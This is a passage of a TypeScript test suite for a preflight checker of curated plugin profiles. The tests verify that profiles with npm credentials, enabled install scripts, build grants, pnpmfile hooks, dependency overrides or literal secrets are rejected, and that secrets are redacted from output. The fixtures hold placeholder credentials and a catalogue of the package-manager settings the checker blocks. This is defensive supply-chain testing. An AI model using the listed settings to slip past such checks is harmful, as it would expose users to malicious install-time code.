      writeFileSync(patchPath, '[]\n')
      writeFileSync(manifestPath, JSON.stringify({
        name: 'dsh-profile-web-curated',
        private: true,
        dsh: { profile: { bundles: [] } },
      }))
      const emptyPayload = JSON.parse(
        runPreflight(['--profile', 'web-curated', '--json'], { profileRoot }).stdout,
      ) as { issues: Array<{ code: string }> }
      expect(emptyPayload.issues)
        .toContainEqual(expect.objectContaining({ code: 'preflight-profile-bundles-empty' }))

      writeFileSync(manifestPath, JSON.stringify(safeManifest))
      const mismatchPayload = JSON.parse(runPreflight(['--profile', 'web-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      }).stdout) as { issues: Array<{ code: string }> }
      expect(mismatchPayload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-profile-template-mismatch',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('rejects npm basic auth credentials without echoing them', () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-npm-auth-'))
    const credential = 'dXNlcjpwYXNzd29yZA=='
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['fixture-local-bundle'] } },
      }))
      writeFileSync(join(profileRoot, '.npmrc'), `_auth=${credential}\n`)
      stageCandidatePackage(profileRoot, 'fixture-local-bundle')

      const result = runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status).toBe(1)
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }
      expect(payload.issues).toContainEqual({
        code: 'preflight-profile-metadata-secret',
        target: '.npmrc',
        message: 'profile package-manager metadata must not contain secret material',
      })
      expect(result.stdout).not.toContain(credential)
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'non-string dependency version',
      mutate: (manifest: Record<string, unknown>) => {
        const dependencies = manifest.dependencies as Record<string, unknown>
        dependencies[Object.keys(dependencies)[0] as string] = 1
      },
    },
    {
      name: 'non-empty bundled dependency list',
      mutate: (manifest: Record<string, unknown>) => { manifest.bundledDependencies = ['unexpected'] },
    },
    {
      name: 'non-empty development dependency map',
      mutate: (manifest: Record<string, unknown>) => { manifest.devDependencies = { unexpected: '1.0.0' } },
    },
    {
      name: 'malformed optional dependency field',
      mutate: (manifest: Record<string, unknown>) => { manifest.optionalDependencies = 'unexpected' },
    },
  ])('rejects generated curated manifest metadata with a $name', async ({ mutate }) => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-generated-manifest-'))
    try {
      const profileRoot = materializeCuratedProfile('web-personal', home)
      stageEmptyManagedPnpmEvidence(profileRoot)
      const manifestPath = join(profileRoot, 'package.json')
      const manifest = JSON.parse(readFileSync(manifestPath, 'utf8')) as Record<string, unknown>
      mutate(manifest)
      writeFileSync(manifestPath, JSON.stringify(manifest))

      const result = runPreflight(['--profile', 'web-personal', '--json'], { profileRoot })
      const smoke = await runSmokeProfile(['--profile', 'web-personal', '--json'], {
        profiles: { 'web-personal': CURATED_PROFILE_TEMPLATES['web-personal'] },
        profileRoot,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })

      expect(result.status).toBe(1)
      expect(commandIssues(result)).toContainEqual({
        code: 'preflight-profile-generated-manifest-mismatch',
        target: 'package.json',
        message: 'curated profile manifest must match generated profile metadata',
      })
      expect(smoke.status).toBe(1)
      expect(smoke.stdout).toContain('curated profile manifest must match generated profile metadata')
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('rejects script execution grants and package transformations in observed curated profiles', async () => {
    const cases = [
      {
        name: 'scripts setting missing',
        path: '.npmrc',
        content: null,
        code: 'preflight-profile-scripts-enabled',
      },
      {
        name: 'scripts enabled',
        path: '.npmrc',
        content: 'ignore-scripts=false\n',
        code: 'preflight-profile-scripts-enabled',
      },
      {
        name: 'setting without a separator',
        path: '.npmrc',
        content: 'ignore-scripts\n',
        code: 'preflight-profile-scripts-enabled',
      },
      {
        name: 'setting with an empty key',
        path: '.npmrc',
        content: '=ignore-scripts\n',
        code: 'preflight-profile-scripts-enabled',
      },
      {
        name: 'script policy without a value',
        path: '.npmrc',
        content: 'ignore-scripts=\n',
        code: 'preflight-profile-scripts-enabled',
      },
      {
        name: 'additional registry setting',
        path: '.npmrc',
        content: 'ignore-scripts=true\nregistry=https://registry.example.test/\n',
        code: 'preflight-profile-package-manager-policy',
      },
      {
        name: 'prefix keys do not satisfy protected settings',
        path: '.npmrc',
        content: 'fetch-retries=true\ndeep-registry=https://registry.example.test/\n',
        code: 'preflight-profile-scripts-enabled',
      },
      {
        name: 'duplicate script policy key',
        path: '.npmrc',
        content: 'ignore-scripts=false\nignore-scripts=true\n',
        code: 'preflight-profile-scripts-enabled',
      },
      {
        name: 'package build grant',
        path: 'pnpm-workspace.yaml',
        content: 'packages:\n  - .\nallowBuilds:\n  plugin-a: true\n',
        code: 'preflight-profile-build-grant',
      },
      {
        name: 'legacy package build grant',
        path: 'pnpm-workspace.yaml',
        content: 'packages:\n  - .\nonlyBuiltDependencies:\n  - plugin-a\n',
        code: 'preflight-profile-build-grant',
      },
      {
        name: 'malformed package build grant',
        path: 'pnpm-workspace.yaml',
        content: 'packages:\n  - .\nallowBuilds:\n  plugin-a: enabled\n',
        code: 'preflight-profile-build-grant',
      },
      {
        name: 'malformed build grant collection',
        path: 'pnpm-workspace.yaml',
        content: 'packages:\n  - .\nallowBuilds: []\n',
        code: 'preflight-profile-build-grant',
      },
      {
        name: 'malformed legacy build grant',
        path: 'pnpm-workspace.yaml',
        content: 'packages:\n  - .\nonlyBuiltDependencies: plugin-a\n',
        code: 'preflight-profile-build-grant',
      },
      {
        name: 'external legacy build grant',
        path: 'pnpm-workspace.yaml',
        content: 'packages:\n  - .\nonlyBuiltDependenciesFile: builds.json\n',
        code: 'preflight-profile-build-grant',
      },
      {
        name: 'malformed unrestricted build grant',
        path: 'pnpm-workspace.yaml',
        content: 'packages:\n  - .\ndangerouslyAllowAllBuilds: enabled\n',
        code: 'preflight-profile-build-grant',
      },
      {
        name: 'workspace scripts enabled',
        path: 'pnpm-workspace.yaml',
        content: 'packages:\n  - .\nignoreScripts: false\n',
        code: 'preflight-profile-build-grant',
      },
      {
        name: 'malformed workspace metadata',
        path: 'pnpm-workspace.yaml',
        content: '- .\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'patched dependency',
        path: 'pnpm-workspace.yaml',
        content: 'packages:\n  - .\npatchedDependencies:\n  plugin-a@1.0.0: patches/plugin-a.patch\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'empty legacy build list with patched dependency',
        path: 'pnpm-workspace.yaml',
        content: 'packages:\n  - .\nonlyBuiltDependencies: []\npatchedDependencies: {}\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'disabled build grant with patched dependency',
        path: 'pnpm-workspace.yaml',
        content: 'packages:\n  - .\nallowBuilds:\n  plugin-a: false\npatchedDependencies: {}\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'package extension',
        path: 'pnpm-workspace.yaml',
        content: 'packages:\n  - .\npackageExtensions:\n  plugin-a@1.0.0:\n    dependencies:\n      injected: 1.0.0\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'workspace dependency override',
        path: 'pnpm-workspace.yaml',
        content: 'packages:\n  - .\noverrides:\n  transitive-package: 9.9.9\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'manifest patch declaration',
        path: 'package.json',
        content: '{"pnpm":{"patchedDependencies":{}}}\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'manifest dependency override',
        path: 'package.json',
        content: '{"pnpm":{"overrides":{"transitive-package":"9.9.9"}}}\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'manifest build grant',
        path: 'package.json',
        content: '{"pnpm":{"allowBuilds":{"plugin-a":true}}}\n',
        code: 'preflight-profile-build-grant',
      },
      {
        name: 'malformed manifest pnpm metadata',
        path: 'package.json',
        content: '{"pnpm":[]}\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'manifest config dependency',
        path: 'package.json',
        content: '{"pnpm":{"configDependencies":{"@pnpm/config-plugin":"1.0.0"}}}\n',
        code: 'preflight-profile-package-manager-policy',
      },
      {
        name: 'package transform hook',
        path: '.pnpmfile.cjs',
        content: 'module.exports = { hooks: {} }\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'legacy package transform hook',
        path: '.pnpmfile.js',
        content: 'module.exports = { hooks: {} }\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'module package transform hook',
        path: '.pnpmfile.mjs',
        content: 'export default { hooks: {} }\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'configured package transform hook',
        path: '.npmrc',
        content: 'ignore-scripts=true\npnpmfile=custom-pnpmfile.cjs\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'configured global package transform hook',
        path: '.npmrc',
        content: 'ignore-scripts=true\nglobal-pnpmfile=custom-pnpmfile.cjs\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'configured patch directory',
        path: '.npmrc',
        content: 'ignore-scripts=true\npatches-dir=patches\n',
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'patched lock',
        path: 'pnpm-lock.yaml',
        content: "lockfileVersion: '9.0'\npackageExtensions: {}\n",
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'dependency override root lock',
        path: 'pnpm-lock.yaml',
        content: "lockfileVersion: '9.0'\noverrides:\n  transitive-package: 9.9.9\n",
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'dependency override installed lock',
        path: 'node_modules/.pnpm/lock.yaml',
        content: "lockfileVersion: '9.0'\noverrides:\n  transitive-package: 9.9.9\n",
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'package extension checksum lock',
        path: 'pnpm-lock.yaml',
        content: "lockfileVersion: '9.0'\nsettings:\n  packageExtensionsChecksum: sha256-fixture\n",
        code: 'preflight-profile-package-transformation',
      },
      {
        name: 'pnpmfile checksum lock',
        path: 'pnpm-lock.yaml',
        content: "lockfileVersion: '9.0'\nsettings:\n  pnpmfileChecksum: sha256-fixture\n",
        code: 'preflight-profile-package-transformation',
      },
    ] as const

    for (const testCase of cases) {
      const home = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-package-manager-policy-'))
      try {
        const profileRoot = materializeCuratedProfile('web-personal', home)
        stageEmptyManagedPnpmEvidence(profileRoot)
        const content = testCase.path === 'package.json'
          ? JSON.stringify({
            ...JSON.parse(readFileSync(join(profileRoot, testCase.path), 'utf8')) as Record<string, unknown>,
            ...JSON.parse(testCase.content ?? '{}') as Record<string, unknown>,
          })
          : testCase.content
        if (content === null) rmSync(join(profileRoot, testCase.path))
        else {
          mkdirSync(dirname(join(profileRoot, testCase.path)), { recursive: true })
          writeFileSync(join(profileRoot, testCase.path), content)
        }

        const verify = runVerifyLockCommand(['--artifact-root', profileRoot, '--json'])
        const preflight = runPreflight(['--profile', 'web-personal', '--json'], { profileRoot })
        const smoke = await runSmokeProfile(['--profile', 'web-personal', '--json'], {
          profiles: { 'web-personal': CURATED_PROFILE_TEMPLATES['web-personal'] },
          profileRoot,
          runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
        })

        for (const result of [verify, preflight, smoke]) {
          expect.soft(result.status, testCase.name).toBe(1)
        }
        expect.soft(commandIssues(preflight), testCase.name).toContainEqual(expect.objectContaining({
          code: testCase.code,
        }))
      } finally {
        rmSync(home, { recursive: true, force: true })
      }
    }
  })

  it.each([
    {
      name: 'scripts enabled',
      manifestExtra: {},
      workspace: 'packages:\n  - .\n',
      npmrc: 'ignore-scripts=false\n',
      expected: 'must set ignore-scripts=true',
    },
    {
      name: 'duplicate script policy',
      manifestExtra: {},
      workspace: 'packages:\n  - .\n',
      npmrc: 'ignore-scripts=false\nignore-scripts=true\n',
      expected: 'must set ignore-scripts=true',
    },
    {
      name: 'workspace build grant',
      manifestExtra: {},
      workspace: 'packages:\n  - .\nallowBuilds:\n  plugin-a: true\n',
      npmrc: 'ignore-scripts=true\n',
      expected: 'must not grant dependency lifecycle builds',
    },
    {
      name: 'root manifest override',
      manifestExtra: { pnpm: { overrides: { 'transitive-package': '9.9.9' } } },
      workspace: 'packages:\n  - .\n',
      npmrc: 'ignore-scripts=true\n',
      expected: 'must not transform dependency packages',
    },
    {
      name: 'workspace override',
      manifestExtra: {},
      workspace: 'packages:\n  - .\noverrides:\n  transitive-package: 9.9.9\n',
      npmrc: 'ignore-scripts=true\n',
      expected: 'must not transform dependency packages',
    },
  ])('rejects a managed custom profile with a $name before observed execution', async ({
    expected,
    manifestExtra,
    npmrc,
    workspace,
  }) => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-managed-custom-override-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-custom-curated',
        private: true,
        dsh: { profile: { bundles: ['@deepseek-ai/dsh-base'] } },
        ...manifestExtra,
      }))
      writeFileSync(join(profileRoot, '.npmrc'), npmrc)
      writeFileSync(join(profileRoot, 'pnpm-workspace.yaml'), workspace)

      const verify = runVerifyLockCommand(['--artifact-root', profileRoot, '--json'])
      const preflight = runPreflight(['--profile', 'custom-curated', '--json'], { profileRoot })
      let runnerCalls = 0
      const smoke = await runSmokeProfile(['--profile', 'custom-curated', '--json'], {
        profiles: { 'custom-curated': { bundles: ['@deepseek-ai/dsh-base'] } },
        profileRoot,
        runner: async () => {
          runnerCalls += 1
          return { status: 0, stdout: '', stderr: '', durationMs: 1 }
        },
      })

      for (const result of [verify, preflight, smoke]) {
        expect(result.status, result.stdout).toBe(1)
        expect(result.stdout).toContain(expected)
      }
      expect(runnerCalls).toBe(0)
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('applies config-only overrides and accepts fail-closed baseline settings', () => {
    const path = tempFile('patch.yml', `- id: memento
  name: dsh-memento
- id: memento
  config:
    proposals:
      enabled: false
    writePolicies: {}
    writePolicy: ask
- id: untouched
  name: plugin-a
- id: untouched
- id: permission-rules
  config:
    badFilePolicy: fail
    enforce: true
- id: loongsuite-observability
  config:
    captureContent: false
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ code: 'preflight-entry-id-duplicate', target: 'untouched' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('accepts an inactive fallback provider', () => {
    const path = tempFile('patch.yml', `- id: active-search
  name: plugin-a
  config:
    curated:
      candidateId: plugin-a
      profile: web-curated
      active: true
      capability: web-search
- id: inactive-search
  name: plugin-b
  config:
    curated:
      candidateId: plugin-b
      profile: web-curated
      active: false
      capability: web-search
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toEqual({
        command: 'preflight',
        ok: true,
        observed: false,
        accepted: false,
        profile: 'web-curated',
        entryCount: 2,
        issues: [],
      })
    } finally {
      cleanup(path)
    }
  })

  it('uses conflict-table provider ids when active entries declare different capabilities', () => {
    const path = tempFile('patch.yml', `- id: context
  name: dsh-context
  config:
    curated:
      candidateId: dsh-context
      profile: web-curated
      active: true
      capability: context-compression
- id: context-doctor
  name: dsh-context-doctor
  config:
    curated:
      candidateId: dsh-context-doctor
      profile: web-curated
      active: true
      capability: context-diagnostics
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{
          code: 'preflight-provider-duplicate',
          target: 'dsh-context-doctor',
          details: {
            capability: 'context-compression',
            candidates: ['dsh-context', 'dsh-context-doctor'],
          },
        }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects malformed present curated active values without activating inactive entries', () => {
    const path = tempFile('patch.yml', `- id: inactive-search
  name: plugin-a
  config:
    curated:
      candidateId: plugin-a
      profile: web-curated
      active: false
      capability: web-search
- id: string-active
  name: plugin-b
  config:
    curated:
      candidateId: plugin-b
      profile: web-curated
      active: "true"
      capability: web-search
- id: list-active
  name: plugin-c
  config:
    curated:
      candidateId: plugin-c
      profile: web-curated
      active: [true]
      capability: memory
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toEqual({
        command: 'preflight',
        ok: false,
        observed: false,
        accepted: false,
        profile: 'web-curated',
        entryCount: 3,
        issues: [
          {
            code: 'preflight-curated-active-invalid',
            target: 'plugin-b',
            message: 'curated.active must be true or false when present',
          },
          {
            code: 'preflight-curated-active-invalid',
            target: 'plugin-c',
            message: 'curated.active must be true or false when present',
          },
        ],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects duplicate providers, resources, and config secrets with redacted output', () => {
    const path = tempFile('patch.yml', `- id: search-a
  name: plugin-a
  config:
    curated:
      candidateId: plugin-a
      profile: web-curated
      active: true
      capability: web-search
      resources:
        toolNames: [web_search]
        commandNames: [search]
        serviceKeys: [web]
        uiSlots: [search-panel]
        settingsTabs: [settings:search]
        routes: [/search]
        ports: ["127.0.0.1:3000"]
        sqlitePaths: [state/search.sqlite]
        cacheDirs: [cache/search]
        envVars: [SEARCH_TOKEN]
        waterfallListeners: [tools/pre-execute:next]
        automationBehaviors: [auto-memory]
    apiKey: sk-test-secret-value
- id: search-a
  name: plugin-b
  config:
    curated:
      candidateId: plugin-b
      profile: web-curated
      active: true
      capability: web-search
      resources:
        toolNames: [web_search]
        commandNames: [search]
        serviceKeys: [web]
        uiSlots: [search-panel]
        settingsTabs: [settings:search]
        routes: [/search]
        ports: ["127.0.0.1:3000"]
        sqlitePaths: [state/search.sqlite]
        cacheDirs: [cache/search]
        envVars: [SEARCH_TOKEN]
        waterfallListeners: [tools/pre-execute:next]
        automationBehaviors: [auto-memory]
`)
    try {
      const result = runPreflight(['--fixture', path])

      expect(result.status).toBe(1)
      expect(result.stdout).toContain('preflight: failed')
      expect(result.stdout).toContain('preflight-entry-id-duplicate search-a')
      expect(result.stdout).toContain('preflight-provider-duplicate plugin-b')
      expect(result.stdout).toContain('profile web-curated capability web-search has multiple active candidates: plugin-a, plugin-b')
      expect(result.stdout).toContain('preflight-tool-name-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-command-name-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-service-key-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-ui-slot-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-settings-tab-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-route-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-port-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-sqlite-path-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-cache-dir-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-env-var-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-waterfall-listener-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-automation-behavior-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-config-secret search-a')
      expect(result.stdout).not.toContain('sk-test-secret-value')
      expect(result.stdout).not.toContain('SEARCH_TOKEN')
    } finally {
      cleanup(path)
    }
  })

  it('preserves redacted structured details for config secret issues', () => {
    const path = tempFile('patch.yml', `- id: secret-config
  name: plugin-a
  config:
    apiKey: sk-test-secret-value
    retries: 2
    nested:
      safe: visible
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ code: string; target?: string; details?: unknown }>
      }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        {
          code: 'preflight-config-secret',
          target: 'secret-config',
          message: 'entry config must not contain secret material',
          details: {
            config: {
              apiKey: '[REDACTED]',
              retries: 2,
              nested: {
                safe: 'visible',
              },
            },
          },
        },
      ])
      expect(result.stdout).not.toContain('sk-test-secret-value')
    } finally {
      cleanup(path)
    }
  })

  it('accepts environment variable names in secret-bearing Env fields and rejects literal values', () => {
    const acceptedPath = tempFile('accepted-env.yml', `- id: env-reference
  config:
    apiKeyEnv: DEEPSEEK_API_KEY
    nested:
      tokenEnv: CURATED_ACCESS_TOKEN
`)
    const rejectedPath = tempFile('rejected-env.yml', `- id: env-literal
  config:
    apiKeyEnv: literal-secret-value
`)
    try {
      const accepted = runPreflight(['--fixture', acceptedPath, '--json'])
      expect(accepted.status).toBe(0)
      expect(JSON.parse(accepted.stdout)).toMatchObject({ issues: [] })

      const rejected = runPreflight(['--fixture', rejectedPath, '--json'])
      expect(rejected.status).toBe(1)
      expect(JSON.parse(rejected.stdout)).toMatchObject({
        issues: [{ code: 'preflight-config-secret', target: 'env-literal' }],
      })
      expect(rejected.stdout).not.toContain('literal-secret-value')
    } finally {
      cleanup(acceptedPath)
      cleanup(rejectedPath)
    }
  })

  it('rejects secret-like values even when they are valid environment variable names', () => {
    const path = tempFile('secret-env.yml', `- id: env-secret
  config:
    apiKeyEnv: ghp_actual_token
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ code: 'preflight-config-secret', target: 'env-secret' }],
      })
      expect(result.stdout).not.toContain('ghp_actual_token')
    } finally {
      cleanup(path)
    }
  })

  it('rejects two active multi-agent orchestrators in one profile', () => {
    const path = tempFile('patch.yml', `- id: agent-team-gui
  name: dsh-agent-team-gui
  config:
    curated:
      candidateId: dsh-agent-team-gui
      profile: web-coding
      active: true
      capability: multi-agent-orchestration
- id: background-agents
  name: dsh-background-agents
  config:
    curated:
      candidateId: dsh-background-agents
      profile: web-coding
      active: true
      capability: multi-agent-orchestration
`)
    try {
      const result = runPreflight(['--fixture', path, '--profile', 'web-coding', '--json'])
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{
          code: string
          target?: string
          message: string
          details?: unknown
        }>
      }

      expect(result.status).toBe(1)
      expect(payload).toMatchObject({
        command: 'preflight',
        ok: false,
        profile: 'web-coding',
        issues: [
          {
            code: 'preflight-provider-duplicate',
            target: 'dsh-background-agents',
            message: 'profile web-coding capability multi-agent-orchestration has multiple active candidates: dsh-agent-team-gui, dsh-background-agents',
            details: {
              profile: 'web-coding',
              capability: 'multi-agent-orchestration',
              candidates: ['dsh-agent-team-gui', 'dsh-background-agents'],
            },
          },
        ],
      })
    } finally {
      cleanup(path)
    }
  })

  it('parses Cordis include YAML through the source-tree wrapper', () => {
    const path = tempFile('patch.yml', `- id: curated-policy
  name: '@deepseek-ai/dsh-curated-policy'
  config:
    curated:
      candidateId: policy
      profile: web-curated
      active: true
      capability: web-search
`)
    try {
      const result = runNode('preflight.mjs', ['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: true,
        profile: 'web-curated',
        entryCount: 1,
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects active curated entries whose capability is not governed', () => {
    const path = tempFile('patch.yml', `- id: custom-capability
  name: plugin-a
  config:
    curated:
      profile: web-curated
      active: true
      capability: custom-capability
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: false,
        issues: [{ code: 'preflight-capability-unmanaged', target: 'plugin-a' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects malformed patch inputs in text mode', () => {
    const path = tempFile('patch.yml', 'not: a list\n')
    try {
      const result = runPreflight(['--fixture', path])

      expect(result.status).toBe(1)
      expect(result.stderr).toBe('')
      expect(result.stdout).toContain('preflight: failed (1 issue)')
      expect(result.stdout).toContain('preflight-input-invalid')
      expect(result.stdout).toContain('curated patch must be a top-level YAML array')
    } finally {
      cleanup(path)
    }
  })

  it.each([
    ['unicode escaped key', '"api\\u004bey": unicode scalar multiword suffix', ['unicode scalar multiword suffix', 'multiword suffix']],
    ['escaped quote key', '"service\\"ApiKey": escaped quote scalar trailing words', ['escaped quote scalar trailing words', 'trailing words']],
    ['registry token key', 'registryToken: registry scalar trailing words', ['registry scalar trailing words', 'trailing words']],
    ['service API key', 'serviceApiKey: service scalar trailing words', ['service scalar trailing words', 'trailing words']],
    ['block scalar', 'apiKey: |-\n      first block secret\n      second block secret', ['first block secret', 'second block secret']],
    [
      'PEM block',
      'privateKey: |\n      -----BEGIN PRIVATE KEY-----\n      PEMSECRETBODY\n      -----END PRIVATE KEY-----',
      ['BEGIN PRIVATE KEY', 'PEMSECRETBODY', 'END PRIVATE KEY'],
    ],
  ])('redacts escape-aware secret values from malformed YAML diagnostics with a %s', (_name, secretYaml, secretFragments) => {
    const path = tempFile('patch.yml', `- id: malformed
  config:
    ${secretYaml}
    unrelated: keep-diagnostic-context
  broken: [
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      const message = commandIssues(result)[0]?.message ?? ''
      expect(message).toContain('unexpected end of the stream')
      expect(message).toContain('patch.yml')
      expect(message).toMatch(/line \d+, column \d+/u)
      expect(message).toContain('[REDACTED]')
      expect(message).toContain('unrelated: keep-diagnostic-c')
      expect(message).toContain('broken: [')
      expect(message).toContain('^')
      for (const fragment of secretFragments) expect(result.stdout).not.toContain(fragment)
    } finally {
      cleanup(path)
    }
  })

  it.each([
    ['double quoted', '"apiKey"', '"LEAK_DQ"'],
    ['Unicode escaped', '"api\\u004bey"', '"LEAK_U"'],
    ['quote escaped', '"service\\"ApiKey"', '"LEAK_EQ"'],
    ['unquoted', 'apiKey', 'LEAK_UQ'],
    ['single quoted', "'serviceApiKey'", "'LEAK_SQ'"],
  ])('redacts a later zero-space %s secret key on a malformed flow-mapping line', (_name, key, secret) => {
    const path = tempFile('patch.yml', `- id: malformed
  config:
    value: {visible:ok,${key}:${secret},broken:[}
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const message = commandIssues(result)[0]?.message ?? ''

      expect(result.status).toBe(1)
      expect(message).toContain('[REDACTED]')
      expect(message).not.toContain(secret)
      expect(message).not.toContain('visible:ok')
      expect(message).toMatch(/line \d+, column \d+/u)
      expect(message).toContain('^')
    } finally {
      cleanup(path)
    }
  })

  it.each([
    ['plain value', '? apiKey\n    : correct horse battery staple', ['correct', 'horse', 'battery', 'staple']],
    ['quoted value', '? apiKey\n    : "quoted explicit secret suffix"', ['quoted explicit secret suffix', 'secret suffix']],
    ['escaped key', '? "api\\u004bey"\n    : escaped explicit value suffix', ['escaped explicit value suffix', 'value suffix']],
    ['folded value', '? apiKey\n    : >-\n      folded explicit first\n      folded explicit second', ['folded explicit first', 'folded explicit second']],
    ['multiline quoted value', '? apiKey\n    : "multiline explicit first\n      multiline explicit second"', ['multiline explicit first', 'multiline explicit second']],
  ])('redacts a complete explicit-key %s from malformed YAML diagnostics', (_name, explicitYaml, secretFragments) => {
    const path = tempFile('patch.yml', `- id: malformed
  config:
    ${explicitYaml}
    unrelated: keep-explicit-context
  broken: [
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const message = commandIssues(result)[0]?.message ?? ''

      expect(result.status).toBe(1)
      expect(message).toContain('[REDACTED]')
      expect(message).toContain('unrelated: keep-explicit-cont')
      expect(message).toContain('broken: [')
      expect(message).toMatch(/line \d+, column \d+/u)
      expect(message).toContain('^')
      for (const fragment of secretFragments) expect(result.stdout).not.toContain(fragment)
    } finally {
      cleanup(path)
    }
  })

  it.each([
    ['sequence plain value', '- ? apiKey\n      : correct horse battery staple', '      ', ['correct horse battery staple', 'battery staple']],
    ['sequence Unicode key and multiline double-quoted value', '- ? "api\\u004bey"\n      : "double secret first\n        double secret suffix"', '      ', ['double secret first', 'double secret suffix']],
    ['sequence escaped double-quoted key', '- ? "service\\"ApiKey"\n      : escaped quote secret suffix', '      ', ['escaped quote secret suffix', 'secret suffix']],
    ['sequence escaped single-quoted key and multiline value', "- ? 'service''ApiKey'\n      : 'single secret first\n        single secret suffix'", '      ', ['single secret first', 'single secret suffix']],
    ['sequence multiline plain value', '- ? apiKey\n      : plain secret first\n        plain secret suffix', '      ', ['plain secret first', 'plain secret suffix']],
    ['sequence block value', '- ? apiKey\n      : |-\n        block secret first\n        block secret suffix', '      ', ['block secret first', 'block secret suffix']],
    ['compact explicit pair', '? apiKey : compact secret suffix', '    ', ['compact secret suffix', 'secret suffix']],
  ])('redacts a %s from malformed command YAML diagnostics', (_name, explicitYaml, contextIndent, secretFragments) => {
    const path = tempFile('patch.yml', `- id: malformed
  config:
    ${explicitYaml}
${contextIndent}unrelated: keep-sequence-context
${contextIndent}broken: [
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const message = commandIssues(result)[0]?.message ?? ''

      expect(result.status).toBe(1)
      expect(message).toContain('[REDACTED]')
      expect(message).toContain('unrelated: keep-sequence-c')
      expect(message).toContain('broken: [')
      expect(message).toMatch(/line \d+, column \d+/u)
      expect(message).toContain('^')
      for (const fragment of secretFragments) expect(result.stdout).not.toContain(fragment)
    } finally {
      cleanup(path)
    }
  })

  it('rejects non-entry rows instead of flattening around them', () => {
    const path = tempFile('patch.yml', `- ignored
- insert:
    - id: nested
      name: plugin-a
      config:
        curated:
          capability: web-search
          active: true
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: false,
        issues: [{ code: 'preflight-input-invalid' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects non-curated secret config without a target', () => {
    const path = tempFile('patch.yml', `- config: sk-preflight-secret
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
